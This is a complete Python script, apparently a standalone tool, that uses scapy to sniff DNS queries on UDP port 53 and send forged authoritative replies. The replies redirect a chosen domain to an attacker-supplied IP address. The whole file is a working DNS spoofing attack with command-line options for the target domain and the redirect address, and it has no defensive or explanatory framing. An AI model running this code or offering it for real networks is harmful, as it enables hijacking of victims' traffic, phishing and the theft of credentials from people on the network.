from scapy.all import *
import argparse

def dns_callback(pkt, target_domain, spoof_ip):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode().rstrip(".")
        if target_domain in qname:
            print(f"[+] Spoofing DNS for {qname} -> {spoof_ip}")
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            dns = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=spoof_ip)
            )
            send(ip/udp/dns, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="Simple DNS spoofing script")
    parser.add_argument("--domain", required=True, help="Domain to spoof (e.g. example.com)")
    parser.add_argument("--ip", required=True, help="IP to redirect to")
    args = parser.parse_args()

    print(f"[+] Listening for DNS queries. Spoofing {args.domain} -> {args.ip}")
    sniff(filter="udp port 53", prn=lambda pkt: dns_callback(pkt, args.domain, args.ip))

if __name__ == "__main__":
    main()
